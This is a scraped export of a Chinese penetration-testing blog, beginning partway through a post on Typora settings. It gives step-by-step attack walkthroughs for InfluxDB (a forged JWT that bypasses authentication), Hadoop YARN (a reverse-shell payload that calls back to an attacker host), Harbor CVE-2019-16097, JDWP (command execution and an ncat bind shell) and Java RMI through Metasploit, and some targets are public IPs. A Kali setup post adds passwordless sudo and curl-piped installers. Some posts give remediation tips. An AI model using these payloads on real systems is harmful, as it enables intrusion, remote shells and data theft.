 Open Theme Folder Downloaded from typora      Editor\n Indent Size on Save  Auto ☑️ Pretty indentation Auto Pair  ☑️ Auto pair brackets and quotes ☑️ Auto pair common Markdown syntax Default Copy Behavior  ☑️ Copy Markdown source as plain text          Image\n When Insert ...\n- Copy image to custom folder\n- ../imges\n- ☑️ Apply above rules to local images\n- ☑️ Apply above rules to online images\n- ☑️ User relative path if possible\n- ☑️Auto escape image URL when insert    ","description":"","id":52,"section":"blog","tags":[""],"title":"Built Mr.Frame with Hexo and Git","uri":"http://crkmythical.github.io/blog/built-mr-frame-with-hexo-and-git/"},{"content":"influxdb 是针对时间戳或时间序列数据进行优化的的开源时序数据库,\n由Go语言编写，广泛应用于存储系统的监控数据、loT行业的实时数据等，处理高写入和高查询负载。\n端口服务\n 8083 Web admin管理服务端口 8086 HTTP API的端口 8088 集群端口 9096 中继端口   InfluxDB 1.x HTTP 端点\n    Endpoint Description     /debug/pprof Generate profiles for troubleshooting   /debug/requests Track HTTP client requests to the /write and /query endpoints   /debug/vars Collect internal InfluxDB statistics   /ping Check the status of your InfluxDB instance and your version of InfluxDB   /query Query data using InfluxQL, manage databases, retention policies, and users   /write Write data to a database    信息收集 1 2 3 4 5 6 7 8 9 10 11  sudo nmap -sV -Pn -T4 -sSU -p 8086 -sC 10.199.18.8 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 16:31 CST Nmap scan report for 10.199.18.8 Host is up (0.057s latency). PORT STATE SERVICE VERSION 8086/tcp open http InfluxDB http admin 1.2.4 |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 8086/udp open|filtered d-s-n Nmap done: 1 IP address (1 host up) scanned in 113.41 seconds   debug调试信息泄漏\nhttp://10.199.18.7:8086/debug/vars http://10.199.18.7:8086/debug/pprof/heap http://10.199.18.7:8086/debug/pprof/goroutine http://10.199.18.7:8086/debug/pprof/goroutine?debug=1 http://10.199.18.7:8086/debug/pprof/block http://10.199.18.7:8086/debug/pprof/profile http://10.199.18.7:8086/debug/pprof/threadcreate influxdb认证绕过漏洞 InfluxDB使用jwt作为鉴权方式。\n在用户开启了认证，但未设置参数shared-secret的情况下，JWT token shared-secret 默认为空，\n此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。\ncurl命令复现  服务器未配置身份认证时可直接进行数据库相关操作\n 1 2 3 4 5  curl \u0026#34;http://10.199.18.7:8086/debug/requests\u0026#34; curl -G \u0026#39;http://10.199.18.7:8086/query\u0026#39; --data-urlencode \u0026#39;q=show users\u0026#39; # 服务器未配置认证可直接查询 {\u0026#34;results\u0026#34;:[{\u0026#34;statement_id\u0026#34;:0,\u0026#34;series\u0026#34;:[{\u0026#34;columns\u0026#34;:[\u0026#34;user\u0026#34;,\u0026#34;admin\u0026#34;]}]}]} curl -G \u0026#39;http://10.199.18.7:8086/query\u0026#39; --data-urlencode \u0026#39;q=show databases\u0026#39; # 查询数据库 {\u0026#34;results\u0026#34;:[{\u0026#34;statement_id\u0026#34;:0,\u0026#34;series\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;databases\u0026#34;,\u0026#34;columns\u0026#34;:[\u0026#34;name\u0026#34;],\u0026#34;values\u0026#34;:[[\u0026#34;gnocchi\u0026#34;],[\u0026#34;_internal\u0026#34;],[\u0026#34;test11\u0026#34;]]}]}]}    服务器配置身份认证，但JWT token shared-secret 默认为空时\n 构造JWT Token\n发送POC\n1 2 3 4 5 6  curl -G \u0026#39;http://xxx:8086/query\u0026#39; -v \\ \t--data-urlencode \u0026#39;q=show users\u0026#39; \\  -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNTU5Mjg0OTM1fQ.tUClNot9LgStSw57n26DSn-3NPkBiHizk-XOHMfJJJw\u0026#39; # output {\u0026#34;results\u0026#34;:[{\u0026#34;statement_id\u0026#34;:0,\u0026#34;series\u0026#34;:[{\u0026#34;columns\u0026#34;:[\u0026#34;user\u0026#34;,\u0026#34;admin\u0026#34;],\u0026#34;values\u0026#34;:[[\u0026#34;admin\u0026#34;,true],[\u0026#34;read\u0026#34;,false],[\u0026#34;write\u0026#34;,false],[\u0026#34;telegraf\u0026#34;,true]]}]}]}   BurpSuite复现 1 2 3 4 5 6 7 8 9 10 11 12  POST /query HTTP/1.1 Host: your-ip Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 22 q=show%20users   MSF相关模块利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  msf6 auxiliary(scanner/http/influxdb_enum) \u0026gt; show options Module options (auxiliary/scanner/http/influxdb_enum): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD root yes The password to login with Proxies no A proxy chain of format type:host:port[,type:host:port][...] QUERY SHOW DATABASES yes The influxdb query syntax RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 8086 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path to list all the databases USERNAME root yes The username to login as VHOST no HTTP server virtual host msf6 auxiliary(scanner/http/influxdb_enum) \u0026gt; set rhosts 10.199.18.7 rhosts =\u0026gt; 10.199.18.7 msf6 auxiliary(scanner/http/influxdb_enum) \u0026gt; run [*] Running module against 10.199.18.7 [+] 10.199.18.7:8086 - Influx Version: 1.2.4 [+] File saved in: /Users/ethan/.msf4/loot/20201202195840_default_10.199.18.7_influxdb.enum_380609.txt [*] Auxiliary module execution completed   ","description":"","id":53,"section":"blog","tags":[""],"title":"InfluxDB","uri":"http://crkmythical.github.io/blog/influxdb/"},{"content":"Hadoop是一个Apache基金会所开发的分布式基础架构， 核心设计是HDFS（即分布式文件系统）和MapReduce， * HDFS 为海量数据提供存储 * MapReduce为海量数据提供计算\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14  sudo nmap -sV -Pn -T4 -sSU -p 8088 -sC 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:32 CST Nmap scan report for 192.168.79.207 Host is up (0.00012s latency). PORT STATE SERVICE VERSION 8088/tcp open http Jetty 6.1.26 |_http-server-header: Jetty(6.1.26) | http-title: All Applications |_Requested resource was http://192.168.79.207:8088/cluster 8088/udp closed radan-http Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds   Hadoop Yarn（ResourceManager REST API)未授权漏洞 YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当， 攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行远程执行代码。\n手工或BP测试 Payload\nPOST /ws/v1/cluster/apps HTTP/1.1 Host: 127.0.0.1:8088 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Type: application/json Content-Length: 268 { \u0026quot;application-id\u0026quot;:\u0026quot;application_1604979684298_0006\u0026quot;, \u0026quot;application-name\u0026quot;:\u0026quot;test\u0026quot;, \u0026quot;application-type\u0026quot;:\u0026quot;YARN\u0026quot;, \u0026quot;am-container-spec\u0026quot;:{ \u0026quot;commands\u0026quot;:{ \u0026quot;command\u0026quot;:\u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.79.28/9999 0\u0026gt;\u0026amp;1\u0026quot; } } }  申请新的application，记录application-id字段 直接通过curl进行POST请求  curl -v -X POST 'http://ip:8088/ws/v1/cluster/apps/new-application' 返回包含如下信息 {\u0026quot;application-id\u0026quot;:\u0026quot;application_1527144634877_20465\u0026quot;,\u0026quot;maximum-resource-capability\u0026quot;:{\u0026quot;memory\u0026quot;:16384,\u0026quot;vCores\u0026quot;:8}} 使用nc监听9999端口 nc -lvvp 9999 直接发送构造好的payload  curl -s -i -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' http://ip:8088/ws/v1/cluster/apps --data-binary @1.json 1.json文件中的内容\n1 2 3 4 5 6 7 8 9 10 11  { \u0026#34;am-container-spec\u0026#34;:{ \u0026#34;commands\u0026#34;:{ \u0026#34;command\u0026#34;:\u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.79.28/9999 0\u0026gt;\u0026amp;1\u0026#34; } }, \u0026#34;application-id\u0026#34;:\u0026#34;application_1527144634877_20465\u0026#34;, \u0026#34;application-name\u0026#34;:\u0026#34;test\u0026#34;, \u0026#34;application-type\u0026#34;:\u0026#34;YARN\u0026#34; }   MSF测试 msf6 exploit(linux/http/hadoop_unauth_exec) \u0026gt; show options Module options (exploit/linux/http/hadoop_unauth_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 127.0.0.1 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 8088 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.79.28 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(linux/http/hadoop_unauth_exec) \u0026gt; run [*] Started reverse TCP handler on 192.168.79.28:4444 [*] Sending Command [*] Command Stager progress - 100.00% done (823/823 bytes) [*] Sending stage (3008420 bytes) to 192.168.79.28 [*] Meterpreter session 2 opened (192.168.79.28:4444 -\u0026gt; 192.168.79.28:63414) at 2020-11-10 15:44:07 +0800 meterpreter \u0026gt; 修复建议：  如无必要，关闭Hadoop Web管理页面； 开启服务级别身份验证，如Kerberos认证； 部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问； 限制可信任的IP地址才能访问Hadoop默认开放的多个端口  ","description":"","id":54,"section":"blog","tags":["aa"],"title":"Hadoop","uri":"http://crkmythical.github.io/blog/hadoop/"},{"content":"Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，可以用来构建企业内部的Docker镜像仓库\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  sudo nmap -sV -Pn -T4 -sSU -p 80,443 -sC 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:39 CST Nmap scan report for 192.168.79.207 Host is up (0.0065s latency). PORT STATE SERVICE VERSION 80/tcp filtered http 443/tcp open ssl/http nginx 1.11.5 |_http-server-header: nginx/1.11.5 |_http-title: Harbor | ssl-cert: Subject: commonName=*.mama.cn/organizationName=GZSC/stateOrProvinceName=Guangdong/countryName=CN | Not valid before: 2016-07-08T03:03:28 |_Not valid after: 2017-07-08T03:03:28 |_ssl-date: TLS randomness does not represent time | tls-nextprotoneg: |_ http/1.1 80/udp open|filtered http 443/udp open|filtered https Nmap done: 1 IP address (1 host up) scanned in 132.41 seconds   Harbor任意管理员注册漏洞 CVE-2019-16097 影响版本：\nHarbor 1.7.0-1.8.2，当且仅当镜像仓库开启了用户注册功能\nBurpSuite测试 漏洞存在接口为 /api/users 的 POST 方法，\n当提交的用户参数中包含 has_admin_role: true 时，则可直接注册创建权限为管理员的账号，\n并且可上传写入恶意 Docker 镜像，进而可直接感染使用此镜像仓库的 Docker 主机。\nPOST /api/users HTTP/1.1 Host: 127.0.0.1 Content-Length: 131 Accept: application/json Origin: http://127.0.0.1 User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14 Content-Type: application/json Referer: http://127.0.0.1/harbor/sign-in Accept-Language: zh-CN,zh;q=0.9 Cookie: sid=5bb9aad90164bd2ed5274edaf20f9c81 Connection: close {\u0026quot;username\u0026quot;:\u0026quot;mrhonest\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;mrhonest@qq.com\u0026quot;,\u0026quot;realname\u0026quot;:\u0026quot;mrhonest\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;111111Aaa\u0026quot;,\u0026quot;comment\u0026quot;:\u0026quot;11111\u0026quot;,\u0026quot;has_admin_role\u0026quot;:true} 注册时抓包 添加poc  \u0026quot;has_admin_role\u0026quot;:true  管理员权限 Python脚本 harbor添加管理员漏洞检测工具\n","description":"","id":55,"section":"blog","tags":[""],"title":"Harbor","uri":"http://crkmythical.github.io/blog/harbor/"},{"content":"JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，\n通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息。\n在调试Android应用程序这一场景中，\n Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB， Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART）， JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。  信息收集 \u0026gt;\u0026gt;\u0026gt;nmap -Pn -T4 -sV -p 2005 10.184.67.1 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-03 16:54 CST Nmap scan report for 10.184.67.1 Host is up (0.043s latency). PORT STATE SERVICE VERSION 2005/tcp open jdwp Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_45 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds 不靠谱 \u0026gt;\u0026gt;\u0026gt;nmap -Pn -T4 -sV -p 2005 --script jdwp-exec --script-args cmd=\u0026quot;date\u0026quot; 10.184.67.1 \u0026gt;\u0026gt;\u0026gt;nmap -Pn -T4 -sV -p 2005 --script jdwp-info,jdwp-inject 10.184.67.1 JDWP远程代码执行漏洞 telnnet 120.197.8.190 8000后，查看回显，如果出现“JDWP-Handshake”，则证明漏洞存在。\nFofa语法 语法：banner=”jdwp”\n120.197.8.190\n测试是否存在 telnet/nc端口后，输入命令JDWP-Handshake\n如果返回JDWP-Handshake，证明存在漏洞。\n{ echo \u0026quot;JDWP-Handshake\u0026quot;; sleep 20 } | telnet 221.221.221.221 10010 { echo \u0026quot;JDWP-Handshake\u0026quot;; sleep 1 | trap exit INT} | nc 221.221.221.221 10010 IOActive/jdwp-shellifier利用  远程命令执行\n本地执行python jdwp-shellifier.py -t 120.197.8.190 -p 8000 \u0026ndash;break-on \u0026ldquo;java.lang.String.indexOf\u0026rdquo; \u0026ndash;cmd \u0026ldquo;whoami\u0026rdquo;   ./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on \u0026quot;java.lang.String.indexOf\u0026quot; --cmd \u0026quot;whoami\u0026quot; [+] Targeting '10.184.67.1:2005' [+] Reading settings for 'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_45' [+] Found Runtime class: id=5456 [+] Found Runtime.getRuntime(): id=7f9cb41916c0 [+] Created break event id=2 [+] Waiting for an event on 'java.lang.String.indexOf' [+] Received matching event from thread 0x5542 [+] Selected payload 'whoami' [+] Command string object created id:5543 [-] Unexpected returned type: expecting Object [!] Command successfully executed 执行whoami，显示执行成功，但是没回显，无法探知。\n 远程命令执行（回显）  本地执行python jdwp-shellifier.py -t 120.197.8.190 -p 8000 \u0026ndash;break-on \u0026ldquo;java.lang.String.indexOf\u0026rdquo; \u0026ndash;cmd \u0026ldquo;ping `whoami`.http://ip.port.grqjsg.ceye.io\u0026quot;\n得到远程主机的用户名为：root\n 反弹SHELL  安装ncat\n./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on \u0026quot;java.lang.String.indexOf\u0026quot; --cmd \u0026quot;sudo yum install -y nc\u0026quot; 反弹shell\n./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on \u0026quot;java.lang.String.indexOf\u0026quot; --cmd \u0026quot;ncat -v -l -p 7777 -e /bin/bash\u0026quot; 连接shell\nnc 10.184.67.1 7777 Metasploit利用 用msfconsole启动Metasploit，并且选用exploit/multi/misc/java_jdwp_debugger漏洞利用模块。\nModule options (exploit/multi/misc/java_jdwp_debugger): Name Current Setting Required Description ---- --------------- -------- ----------- RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS 10.184.67.1 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 2005 yes The target port (TCP) TMP_PATH no A directory where we can write files. Ensure there is a trailing slash Payload options (linux/x64/meterpreter/bind_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LPORT 4444 yes The listen port RHOST 10.184.67.1 no The target address 修复建议  关闭JDWP端口，或者JDWP端口不对公网开放 关闭Java的debug模式（开启该模式对服务器性能有影响）  ","description":"","id":56,"section":"blog","tags":[""],"title":"JDWP","uri":"http://crkmythical.github.io/blog/jdwp/"},{"content":"RMI (Java Remote Method Invocation) Java 远程方法调用，是一种允许一个 JVM 上的 object 调用另一个 JVM 上 object 方法的机制。\nRMI 程序通常包括\n rmi registry naming service，提供 remote object 注册，name 到 remote object 的绑定和查询，是一种特殊的 remote object rmi server 创建 remote object，将其注册到 RMI registry rmi client 通过 name 向 RMI registry 获取 remote object reference (stub)，调用其方法  通常 RMI server 和 registry 运行在同一个 host 的不同端口上\n RMI Registry 默认运行在 1099 端口上\nRMI URL rmi://hostname:port/remoteObjectName\n 信息收集  误报较高\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  nmap -T4 -Pn -sV -p 11099,36753 --script rmi-vuln-classloader 10.200.19.52 Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-26 17:47 CST Nmap scan report for 10.200.19.52 Host is up (0.066s latency). PORT STATE SERVICE VERSION 11099/tcp open java-rmi Java RMI | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | | References: |_ https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb 36753/tcp open java-rmi Java RMI | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | | References: |_ https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds   Java RMI接口枚举 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  msf6 auxiliary(gather/java_rmi_registry) \u0026gt; show options Module options (auxiliary/gather/java_rmi_registry): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.200.19.52 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 11099 yes The target port (TCP) msf6 auxiliary(gather/java_rmi_registry) \u0026gt; run [*] Running module against 10.200.19.52 [*] 10.200.19.52:11099 - Sending RMI Header... [*] 10.200.19.52:11099 - Listing names in the Registry... [+] 10.200.19.52:11099 - 1 names found in the Registry [+] 10.200.19.52:11099 - Name jmxrmi (javax.management.remote.rmi.RMIServerImpl_Stub) found on 10.200.19.52:36753 [*] Auxiliary module execution completed   Java RMI代码执行扫描器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  msf6 auxiliary(scanner/misc/java_rmi_server) \u0026gt; show options Module options (auxiliary/scanner/misc/java_rmi_server): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.200.19.52 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 11099 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/misc/java_rmi_server) \u0026gt; run [+] 10.200.19.52:11099 - 10.200.19.52:11099 Java RMI Endpoint Detected: Class Loader Enabled [*] 10.200.19.52:11099 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed   Java RMI默认配置导致的远程代码执行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  msf6 exploit(multi/misc/java_rmi_server) \u0026gt; show options Module options (exploit/multi/misc/java_rmi_server): Name Current Setting Required Description ---- --------------- -------- ----------- HTTPDELAY 10 yes Time that the HTTP Server will wait for the payload request RHOSTS 192.168.79.28 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 36753 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 12.12.6.178 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port msf6 exploit(multi/misc/java_rmi_server) \u0026gt; run [*] Started reverse TCP handler on 12.12.6.178:4444 [*] 192.168.79.28:36753 - Using URL: http://0.0.0.0:8080/gXZLSG8BnMsa3B5 [*] 192.168.79.28:36753 - Local IP: http://192.168.79.28:8080/gXZLSG8BnMsa3B5 [*] 192.168.79.28:36753 - Server started. [-] 192.168.79.28:36753 - Exploit failed [unreachable]: RuntimeError The connection was refused by the remote host (192.168.79.28:36753). [*] 192.168.79.28:36753 - Server stopped. [*] Exploit completed, but no session was created.   Java RMIConnectionImpl浏览器反序列化提权 msf6 exploit(multi/misc/java_rmi_server) \u0026gt; show options Module options (exploit/multi/misc/java_rmi_server): Name Current Setting Required Description ---- --------------- -------- ----------- HTTPDELAY 10 yes Time that the HTTP Server will wait for the payload request RHOSTS 10.200.19.52 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 11099 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 12.12.6.178 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port msf6 exploit(multi/misc/java_rmi_server) \u0026gt; run [*] Started reverse TCP handler on 12.12.6.178:4444 [*] 10.200.19.52:11099 - Using URL: http://0.0.0.0:8080/oYpjH1vIBWgI4Ua [*] 10.200.19.52:11099 - Local IP: http://192.168.79.28:8080/oYpjH1vIBWgI4Ua [*] 10.200.19.52:11099 - Server started. [*] 10.200.19.52:11099 - Sending RMI Header... [*] 10.200.19.52:11099 - Sending RMI Call... [*] 10.200.19.52:11099 - Replied to request for payload JAR [*] Sending stage (53837 bytes) to 10.200.19.52 [+] Meterpreter sessin 1 opened (192.168.79.28:4444 -\u0026gt; 10.200.19.52:50836) at 2020-11-26 18:31:14 -0800 ","description":"","id":57,"section":"blog","tags":[""],"title":"Java RMI","uri":"http://crkmythical.github.io/blog/java-rmi/"},{"content":"系统配置 设置root密码 1 2  sudo passwd root echo \u0026#34;$USERALL=(ALL:ALL) NOPASSWD: ALL\u0026#34; | sudo tee /etc/sudoers.d/dont-prompt-$USER-for-sudo-password # 执行root权限的命令   更改区域设置 1 2 3 4  sudo dpkg-reconfigure locales \u0026gt; - en_US.UTF-8 \u0026gt; - zh_CN.UTF-8   输入法\u0026amp;字体配置 1 2 3 4 5 6 7 8 9  wget https://ime.sogoucdn.com/dl/index/1605612770/sogoupinyin_2.4.0.2732_amd64.deb?st=dhRiak9ucl6k3GZibQ0Tfg\u0026amp;e=1605918428\u0026amp;fn=sogoupinyin_2.4.0.2732_amd64.deb # 下载搜狗输入法软件包 dpkg -i sougoupinyin.deb #安装输入法 dpkg --configure -a #软件包更新中断时的修复命令 dpkg -r sogoupinyin # 删除软件 dpkg -P sougoupinyin # 删除软件及配置文件 apt install zsh-theme-powerlevel9k # 安装zsh-theme-powerlevel9k字体   升级系统 1 2 3 4 5 6 7 8 9  echo \u0026#34;#deb http://http.kali.org/kali kali-rolling main non-free contrib deb http://mirrors.aliyum.com/kali kali-rolling main non-free contrib deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\u0026#34; | tee /etc/apt/sources.list #配置阿里和中科大源 apt update \u0026amp;\u0026amp; apt upgrade -y # 升级软件列表并更新软件 \\\u0026amp;\u0026amp; apt dist-upgrade -y # 升级系统 \\\u0026amp;\u0026amp; apt clean \u0026amp;\u0026amp; apt autoclean \u0026amp;\u0026amp; apt autoremove -y # 清除 已下载的软件包 和 旧软件包 dpkg -l |grep ^rc|awk \u0026#39;{print $2}\u0026#39; |sudo xargs dpkg -P # 清理系统残存配置   常见清理命令理解\n apt remove/autoremove 卸载软件 apt clean/autoclean 删除软件包    命令 作用     apt purge  删除软件,删除配置信息   apt remove  删除软件(保留配置信息)   apt autoremove 删除为了满足其他软件包的依赖而安装，但现在不再需要的软件包   apt autoclean 删除未安装在系统的软件包   apt clean 删除已安装的软件包(/var/cache/apt/archives内的软件包   apt install \u0026ndash;fix-broken /-f dpkg安装失败时修复依赖关系      安装/清理内核头文件 apt install linux-headers-$(uname -r) dpkg --get-selections | grep linux apt purge \u0026lt;kernel-name\u0026gt; \u0026lt;haders-name\u0026gt; UI优化   主题文件：/usr/share/themes/\n  图标文件：/usr/share/icons/\n  背景壁纸：/usr/share/background/\n  grub启动图片： /usr/share/images/desktop-bas\n login-background.png #进如系统界面的背景图 kali-grub.png　#grub的背景图片 kali-wallpaper_1024×786 #类似的都是桌面背景图    、/usr/share/wallpapers/\n  conky: /etc/conky/\n  终端优化  zsh优化  1 2 3 4 5 6 7 8 9 10 11 12 13  #oh-my-zsh sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; # 安装oh-my-zsh sed -i \u0026#39;s/robbyrussell/gnzh/g\u0026#39; .zshrc # 替换主题 git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions # 下载zsh-autosuggestions插件 git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting # 下载syntax-highling插件 git clone https://github.com/zsh-users/zsh-completions ${ZSH_CUSTOM:=~/.oh-my-zsh/custom}/plugins/zsh-completions # 下载zsh-completions sed -i \u0026#34;s/plugins.*/plugins=(git web-search autojump zsh-autosuggestions zsh-syntax-highlighting zsh-completions )/g\u0026#34; .zshrc # 配置插件 apt install autojump # 安装autojump curl -fsSL https://starship.rs/install.sh | bash #下载prompt-starship echo \u0026#34;ZXZhbCAiJChzdGFyc2hpcCBpbml0IGJhc2gpIgo=\u0026#34; | base64 -d \u0026gt;\u0026gt;~/.zshrc # 添加eval \u0026#34;$(starship init bash)\u0026#34; 到.zshrc rm \u0026#34;$(which starship)\u0026#34; # Locate and delete the starship binary #opt: zsh欢迎语 echo \u0026#34;CiMgenNoIHdlbGNvbWUgYmFubmVyIQpmaWdsZXQgImFza0RpbmciCmVjaG8gLW5lICJUb2RheSBpczpcdFx0JHtyZWR9IiBgZGF0ZWAgO2VjaG8gIiIgI2Rpc3BsYXkgY3VycmVudCB0aW1lCmVjaG8gLW5lICIke2xpZ2h0Z3JlZW59S2VybmVsIEluZm9ybWF0aW9uOiBcdCR7cmVkfSIgYHVuYW1lIC1zbXJgICNkaXNwbGF5IHN5c3RlbSBpbmZvcm1hdGlvbgoK\u0026#34;| base64 -d \u0026gt;\u0026gt; .zshrc \u0026amp;\u0026amp; source .zshrc # 设置zsh欢迎语并立即生效   vim/neovim优化  1  curl -sLf https://spacevim.org/install.sh | bash   tmux优化  1 2 3  git clone https://github.com/gpakosz/.tmux.git ~/.tmux \u0026amp;\u0026amp;\\ ln -s -f .tmux/.tmux.conf \u0026amp;\u0026amp;\\ cp .tmux/.tmux.conf.local . # tmux   eDux-ui终端   https://github.com/GitSquared/edex-ui\n 其他优化 永久开启IP转发功能 1 2 3  echo \u0026#34;net.ipv4.ip_forward=1\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf echo 1 \u0026gt; /proc/sys/net/ipv6/conf/all/forwarding   右键文件编码转换 系统服务配置 PostgreSQL服务 1 2  systemctl start postgresql.service systemctl enable postgresql   设置 SSH 